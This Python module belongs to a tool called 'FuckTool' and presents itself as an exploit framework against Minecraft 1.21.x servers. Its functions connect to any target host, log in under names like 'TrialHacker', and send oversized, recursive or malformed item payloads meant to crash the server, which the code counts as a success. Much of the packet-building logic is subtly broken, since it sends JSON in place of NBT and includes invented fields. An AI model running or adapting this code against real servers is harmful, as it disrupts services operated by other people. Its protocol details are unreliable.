import socket
import struct
import json
import time
import base64
import warnings
from core.command_manager import register_command, BaseCommand
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.columns import Columns

# Supprimer les warnings de scapy
warnings.filterwarnings("ignore", category=DeprecationWarning)

@register_command
class Mc121Command(BaseCommand):
    name = "mc121"
    description = "Minecraft 1.21.x Tricky Trials exploit framework"
    usage = "mc121 <target> [exploit_type]"

    def __init__(self):
        self.console = Console()
        self.protocol_versions = [767, 768]  # 1.21.x protocols
        self.exploits_found = []
        
    def run(self, args):
        # Panel titre avec thème Tricky Trials
        title_panel = Panel.fit(
            Align.center(
                "🏺 [bold magenta]MINECRAFT 1.21.x TRICKY TRIALS EXPLOITER[/bold magenta]\n\n"
                "[yellow]Advanced exploit framework for the latest Minecraft version[/yellow]\n"
                "[cyan]Targets: Trial Chambers, Bundles, Mace, Copper Doors, Data Components[/cyan]"
            ),
            title="⚔️ [bold red]FuckTool - MC 1.21.x Specialist[/bold red]",
            subtitle="Tricky Trials Vulnerability Hunter",
            border_style="magenta",
            padding=(1, 2)
        )
        
        # Panel des nouvelles fonctionnalités 1.21.x
        features_panel = Panel.fit(
            "[bold red]🏺 Trial Chambers & Spawners Exploitation[/bold red]\n"
            "[bold orange1]📦 Bundle Item NBT Corruption[/bold orange1]\n"
            "[bold yellow]⚔️ Mace Weapon Enchantment Overflow[/bold yellow]\n"
            "[bold green]🚪 Copper Door & Tuff Block Exploits[/bold green]\n"
            "[bold cyan]⚗️ Data Components System Attacks[/bold cyan]\n"
            "[bold magenta]🔨 Heavy Core Block Manipulation[/bold magenta]",
            title="🆕 [bold bright_magenta]1.21.x Exclusive Exploits[/bold bright_magenta]",
            border_style="bright_magenta",
            padding=(1, 2)
        )
        
        self.console.print()
        self.console.print(title_panel)
        self.console.print(features_panel)
        
        if len(args) < 1:
            self.show_usage()
            return
            
        target = args[0]
        exploit_type = args[1] if len(args) > 1 else "all"
        
        if ":" not in target:
            target = f"{target}:25565"
            
        self.execute_121_exploits(target, exploit_type)

    def show_usage(self):
        """Affiche l'aide spécialisée 1.21.x"""
        exploits_table = Table(show_header=True, header_style="bold magenta")
        exploits_table.add_column("Exploit Type", style="cyan", width=15)
        exploits_table.add_column("Target", style="yellow", width=20)
        exploits_table.add_column("Description", style="white")
        exploits_table.add_column("Danger", style="red", width=8)
        
        exploits_table.add_row("trial", "Trial Chambers", "Trial spawner NBT corruption", "🔥 HIGH")
        exploits_table.add_row("bundle", "Bundle Items", "Bundle NBT overflow attacks", "⚡ EXTREME")
        exploits_table.add_row("mace", "Mace Weapon", "Enchantment overflow exploit", "💥 CRITICAL")
        exploits_table.add_row("copper", "Copper Blocks", "New block state manipulation", "🚨 MEDIUM")
        exploits_table.add_row("datacomp", "Data Components", "Component system corruption", "💀 MAXIMUM")
        exploits_table.add_row("heavycore", "Heavy Core", "Block physics exploit", "🌊 HIGH")
        exploits_table.add_row("breeze", "Breeze Mob", "Mob packet manipulation", "⚔️ HIGH")
        exploits_table.add_row("all", "All Systems", "Complete 1.21.x scan", "💥💥💥")
        
        panel = Panel(exploits_table, title="🏺 1.21.x Tricky Trials Exploits", border_style="magenta")
        
        examples = Panel(
            "[cyan]mc121 target.com trial[/cyan] - Target trial chambers\n"
            "[cyan]mc121 192.168.1.100 bundle[/cyan] - Bundle item exploits\n"
            "[cyan]mc121 server.net datacomp[/cyan] - Data components attack\n"
            "[cyan]mc121 mc.server.com all[/cyan] - Full 1.21.x exploitation",
            title="📋 Usage Examples",
            border_style="dim magenta"
        )
        
        protocols = Panel(
            "[bold yellow]Supported Protocols:[/bold yellow]\n"
            "🎮 [green]1.21.0[/green] → [cyan]Protocol 767[/cyan]\n"
            "🎮 [green]1.21.1[/green] → [cyan]Protocol 767[/cyan]\n"
            "🎮 [green]1.21.2+[/green] → [cyan]Protocol 768[/cyan]",
            title="🔮 Protocol Support",
            border_style="dim cyan"
        )
        
        self.console.print(panel)
        self.console.print(examples)
        self.console.print(protocols)

    def execute_121_exploits(self, target, exploit_type):
        """Exécute les exploits spécialisés 1.21.x"""
        host, port = target.split(':')
        port = int(port)
        
        info_panel = Panel(
            f"🎯 [yellow]Target:[/yellow] {host}:{port}\n"
            f"🏺 [red]Exploit Type:[/red] {exploit_type.upper()}\n"
            f"🔮 [magenta]Protocol:[/magenta] 1.21.x (767/768)\n"
            f"🚀 [green]Status:[/green] Initializing Tricky Trials exploits...",
            title="🏺 [bold red]MINECRAFT 1.21.x EXPLOITATION[/bold red]",
            border_style="red"
        )
        self.console.print()
        self.console.print(info_panel)
        
        # Sélection des exploits
        if exploit_type == "all":
            exploits_to_run = [
                ("Trial Chambers", self.exploit_trial_chambers),
                ("Bundle Items", self.exploit_bundle_items),
                ("Mace Weapon", self.exploit_mace_weapon),
                ("Copper Blocks", self.exploit_copper_blocks),
                ("Data Components", self.exploit_data_components),
                ("Heavy Core", self.exploit_heavy_core),
                ("Breeze Mob", self.exploit_breeze_mob)
            ]
        else:
            exploit_map = {
                "trial": ("Trial Chambers", self.exploit_trial_chambers),
                "bundle": ("Bundle Items", self.exploit_bundle_items),
                "mace": ("Mace Weapon", self.exploit_mace_weapon),
                "copper": ("Copper Blocks", self.exploit_copper_blocks),
                "datacomp": ("Data Components", self.exploit_data_components),
                "heavycore": ("Heavy Core", self.exploit_heavy_core),
                "breeze": ("Breeze Mob", self.exploit_breeze_mob)
            }
            
            if exploit_type in exploit_map:
                name, func = exploit_map[exploit_type]
                exploits_to_run = [(name, func)]
            else:
                exploits_to_run = [("Trial Chambers", self.exploit_trial_chambers)]
        
        # Exécuter les exploits
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]"),
            BarColumn(),
            console=self.console
        ) as progress:
            
            task = progress.add_task("[magenta]Executing 1.21.x exploits...", total=len(exploits_to_run))
            
            for exploit_name, exploit_func in exploits_to_run:
                progress.update(task, description=f"[yellow]Testing {exploit_name}...")
                
                try:
                    result = exploit_func(host, port)
                    if result:
                        self.exploits_found.append({
                            'name': exploit_name,
                            'result': result,
                            'severity': self.get_exploit_severity(exploit_name)
                        })
                        progress.update(task, description=f"[red]{exploit_name} VULNERABLE!")
                    else:
                        progress.update(task, description=f"[green]{exploit_name} secure")
                        
                except Exception as e:
                    progress.update(task, description=f"[red]{exploit_name} error: {str(e)[:20]}")
                
                progress.advance(task)
                time.sleep(1)
        
        self.show_121_results()

    def exploit_trial_chambers(self, host, port):
        """Exploite les Trial Chambers et Trial Spawners"""
        self.console.print("[dim]  → Testing trial spawner NBT corruption...[/dim]")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            # Handshake 1.21.x
            handshake = self.create_handshake(host, port, 767, 2)
            sock.send(handshake)
            
            # Login
            login = self.create_login_packet(f"TrialHacker_{int(time.time())}")
            sock.send(login)
            
            # Trial Spawner NBT corruption
            corrupted_spawner = self.create_trial_spawner_exploit()
            sock.send(corrupted_spawner)
            
            response = sock.recv(1024)
            sock.close()
            
            return "Trial spawner NBT corruption payload sent"
            
        except Exception as e:
            if "connection reset" in str(e).lower():
                return "Trial chambers exploit caused server crash!"
            return None

    def exploit_bundle_items(self, host, port):
        """Exploite les nouveaux Bundle items"""
        self.console.print("[dim]  → Testing bundle NBT overflow...[/dim]")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            handshake = self.create_handshake(host, port, 767, 2)
            sock.send(handshake)
            
            login = self.create_login_packet(f"BundleHacker_{int(time.time())}")
            sock.send(login)
            
            # Bundle overflow exploit
            bundle_exploit = self.create_bundle_overflow()
            sock.send(bundle_exploit)
            
            sock.close()
            return "Bundle NBT overflow exploit deployed"
            
        except Exception as e:
            if "connection reset" in str(e).lower():
                return "Bundle exploit caused server crash!"
            return None

    def exploit_mace_weapon(self, host, port):
        """Exploite la nouvelle arme Mace"""
        self.console.print("[dim]  → Testing mace enchantment overflow...[/dim]")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            handshake = self.create_handshake(host, port, 767, 2)
            sock.send(handshake)
            
            login = self.create_login_packet(f"MaceHacker_{int(time.time())}")
            sock.send(login)
            
            # Mace enchantment overflow
            mace_exploit = self.create_mace_enchant_exploit()
            sock.send(mace_exploit)
            
            sock.close()
            return "Mace enchantment overflow exploit sent"
            
        except Exception as e:
            if "connection reset" in str(e).lower():
                return "Mace exploit caused server crash!"
            return None

    def exploit_copper_blocks(self, host, port):
        """Exploite les nouveaux blocs de cuivre"""
        self.console.print("[dim]  → Testing copper door/trapdoor exploits...[/dim]")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            handshake = self.create_handshake(host, port, 767, 2)
            sock.send(handshake)
            
            login = self.create_login_packet(f"CopperHacker_{int(time.time())}")
            sock.send(login)
            
            # Copper block state manipulation
            copper_exploit = self.create_copper_exploit()
            sock.send(copper_exploit)
            
            sock.close()
            return "Copper block state manipulation deployed"
            
        except Exception:
            return None

    def exploit_data_components(self, host, port):
        """Exploite le nouveau système Data Components (remplace NBT)"""
        self.console.print("[dim]  → Testing data components corruption...[/dim]")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            handshake = self.create_handshake(host, port, 768, 2)  # Protocol 768 pour 1.21.2+
            sock.send(handshake)
            
            login = self.create_login_packet(f"ComponentHacker_{int(time.time())}")
            sock.send(login)
            
            # Data Components corruption
            component_exploit = self.create_data_component_exploit()
            sock.send(component_exploit)
            
            sock.close()
            return "Data components system corruption deployed"
            
        except Exception as e:
            if "connection reset" in str(e).lower():
                return "Data components exploit caused server crash!"
            return None

    def exploit_heavy_core(self, host, port):
        """Exploite le Heavy Core block"""
        self.console.print("[dim]  → Testing heavy core block physics exploit...[/dim]")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            handshake = self.create_handshake(host, port, 767, 2)
            sock.send(handshake)
            
            login = self.create_login_packet(f"HeavyHacker_{int(time.time())}")
            sock.send(login)
            
            # Heavy Core physics exploit
            heavy_exploit = self.create_heavy_core_exploit()
            sock.send(heavy_exploit)
            
            sock.close()
            return "Heavy core block physics exploit sent"
            
        except Exception:
            return None

    def exploit_breeze_mob(self, host, port):
        """Exploite la nouvelle créature Breeze"""
        self.console.print("[dim]  → Testing breeze mob packet manipulation...[/dim]")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            handshake = self.create_handshake(host, port, 767, 2)
            sock.send(handshake)
            
            login = self.create_login_packet(f"BreezeHacker_{int(time.time())}")
            sock.send(login)
            
            # Breeze mob exploit
            breeze_exploit = self.create_breeze_exploit()
            sock.send(breeze_exploit)
            
            sock.close()
            return "Breeze mob manipulation exploit deployed"
            
        except Exception:
            return None

    # Fonctions de création d'exploits spécialisés 1.21.x

    def create_trial_spawner_exploit(self):
        """Crée un exploit pour les Trial Spawners"""
        # NBT corrompu pour Trial Spawner
        corrupted_nbt = {
            "minecraft:trial_spawner_data": {
                "spawn_potentials": [{"data": {"id": "minecraft:wither"}}] * 10000,
                "spawn_range": 999999,
                "total_mobs": 999999,
                "simultaneous_mobs": 999999,
                "additional_spawn_potentials": "A" * 65535
            }
        }
        
        nbt_data = json.dumps(corrupted_nbt).encode()
        return self.create_creative_inventory_packet(nbt_data)

    def create_bundle_overflow(self):
        """Crée un exploit d'overflow pour Bundle"""
        # Bundle avec trop d'items
        bundle_contents = []
        for i in range(10000):
            bundle_contents.append({
                "id": "minecraft:diamond",
                "Count": 64
            })
        
        bundle_nbt = {
            "minecraft:bundle_contents": bundle_contents,
            "minecraft:custom_name": "A" * 32767
        }
        
        nbt_data = json.dumps(bundle_nbt).encode()
        return self.create_creative_inventory_packet(nbt_data)

    def create_mace_enchant_exploit(self):
        """Crée un exploit d'enchantement pour Mace"""
        # Mace avec enchantements impossibles
        mace_enchants = {}
        for i in range(1000):
            mace_enchants[f"minecraft:sharpness"] = 32767
            mace_enchants[f"minecraft:density"] = 32767  # Nouvel enchantement 1.21.x
            mace_enchants[f"minecraft:breach"] = 32767   # Nouvel enchantement 1.21.x
        
        mace_nbt = {
            "minecraft:enchantments": mace_enchants,
            "minecraft:attribute_modifiers": {
                "modifiers": [
                    {
                        "type": "minecraft:generic.attack_damage",
                        "amount": 999999.0,
                        "operation": "add_value"
                    }
                ] * 1000
            }
        }
        
        nbt_data = json.dumps(mace_nbt).encode()
        return self.create_creative_inventory_packet(nbt_data)

    def create_copper_exploit(self):
        """Crée un exploit pour les blocs de cuivre"""
        # Manipulation des nouveaux états de blocs
        copper_data = {
            "minecraft:copper_door": {
                "facing": "invalid_direction",
                "half": "overflow_half",
                "hinge": "corrupted_hinge",
                "open": "malformed_boolean",
                "powered": 999999
            }
        }
        
        return json.dumps(copper_data).encode()

    def create_data_component_exploit(self):
        """Crée un exploit pour le système Data Components"""
        # Exploit du nouveau système qui remplace NBT
        malicious_components = {
            "minecraft:bundle_contents": ["overflow_item"] * 100000,
            "minecraft:trial_spawner_data": {
                "corrupted_field": "A" * 100000
            },
            "minecraft:enchantments": {
                "levels": {str(i): 32767 for i in range(10000)}
            },
            "minecraft:custom_data": {
                "recursive_data": None  # Sera rempli récursivement
            }
        }
        
        # Créer récursion
        current = malicious_components["minecraft:custom_data"]
        for i in range(1000):
            current["nested_" + str(i)] = {}
            current = current["nested_" + str(i)]
        
        component_data = json.dumps(malicious_components).encode()
        return self.create_creative_inventory_packet(component_data)

    def create_heavy_core_exploit(self):
        """Crée un exploit pour Heavy Core"""
        heavy_core_data = {
            "minecraft:heavy_core": {
                "weight": 999999999,
                "physics_override": True,
                "crash_server": "A" * 65535
            }
        }
        
        return json.dumps(heavy_core_data).encode()

    def create_breeze_exploit(self):
        """Crée un exploit pour Breeze mob"""
        breeze_data = {
            "minecraft:breeze": {
                "wind_charge_power": 999999,
                "jump_power": 999999,
                "ai_corrupted": "A" * 32767
            }
        }
        
        return json.dumps(breeze_data).encode()

    # Fonctions utilitaires

    def create_handshake(self, host, port, protocol, next_state):
        """Crée un packet de handshake"""
        packet_data = (
            self.write_varint(protocol) +
            self.write_string(host) +
            struct.pack('>H', port) +
            self.write_varint(next_state)
        )
        
        packet_length = self.write_varint(len(packet_data) + 1)
        packet_id = self.write_varint(0)
        
        return packet_length + packet_id + packet_data

    def create_login_packet(self, username):
        """Crée un packet de login"""
        login_data = self.write_string(username)
        packet_length = self.write_varint(len(login_data) + 1)
        packet_id = self.write_varint(0)
        
        return packet_length + packet_id + login_data

    def create_creative_inventory_packet(self, nbt_data):
        """Crée un packet Creative Inventory Action avec NBT malveillant"""
        slot = struct.pack('>h', 36)
        item_data = (
            self.write_varint(1) +  # Item present
            self.write_varint(968) +  # Bundle item ID (1.21.x)
            b'\x01' +  # Count
            nbt_data
        )
        
        packet_data = slot + item_data
        packet_length = self.write_varint(len(packet_data) + 1)
        packet_id = self.write_varint(0x18)  # Creative Inventory Action
        
        return packet_length + packet_id + packet_data

    def write_varint(self, value):
        """Écrit un VarInt"""
        data = b''
        while value >= 0x80:
            data += bytes([value & 0x7F | 0x80])
            value >>= 7
        data += bytes([value & 0x7F])
        return data

    def write_string(self, string):
        """Écrit une string avec longueur VarInt"""
        if isinstance(string, str):
            string = string.encode('utf-8')
        return self.write_varint(len(string)) + string

    def get_exploit_severity(self, exploit_name):
        """Retourne la sévérité d'un exploit"""
        severity_map = {
            "Trial Chambers": "HIGH",
            "Bundle Items": "EXTREME", 
            "Mace Weapon": "CRITICAL",
            "Copper Blocks": "MEDIUM",
            "Data Components": "MAXIMUM",
            "Heavy Core": "HIGH",
            "Breeze Mob": "HIGH"
        }
        return severity_map.get(exploit_name, "MEDIUM")

    def show_121_results(self):
        """Affiche les résultats des exploits 1.21.x"""
        if self.exploits_found:
            results_table = Table(show_header=True, header_style="bold red")
            results_table.add_column("1.21.x Exploit", style="yellow")
            results_table.add_column("Status", style="red")
            results_table.add_column("Severity", style="magenta")
            results_table.add_column("Result", style="white")
            
            for exploit in self.exploits_found:
                severity_color = {
                    "MEDIUM": "yellow",
                    "HIGH": "orange1", 
                    "EXTREME": "red",
                    "CRITICAL": "bright_red",
                    "MAXIMUM": "bold red"
                }.get(exploit['severity'], "white")
                
                results_table.add_row(
                    exploit['name'],
                    "🔥 VULNERABLE",
                    f"[{severity_color}]{exploit['severity']}[/{severity_color}]",
                    exploit['result'][:40] + "..." if len(exploit['result']) > 40 else exploit['result']
                )
            
            result_panel = Panel(
                results_table,
                title="🏺 [bold red]MINECRAFT 1.21.x VULNERABILITIES FOUND[/bold red]",
                border_style="red"
            )
        else:
            result_panel = Panel(
                "✅ [green]No 1.21.x vulnerabilities detected[/green]\n"
                "🛡️ [cyan]Server appears secure against Tricky Trials exploits[/cyan]\n"
                "💡 [yellow]Try different exploit types or check server version[/yellow]",
                title="🔒 [bold green]SERVER SECURE[/bold green]",
                border_style="green"
            )
        
        self.console.print()
        self.console.print(result_panel)
        self.console.print()
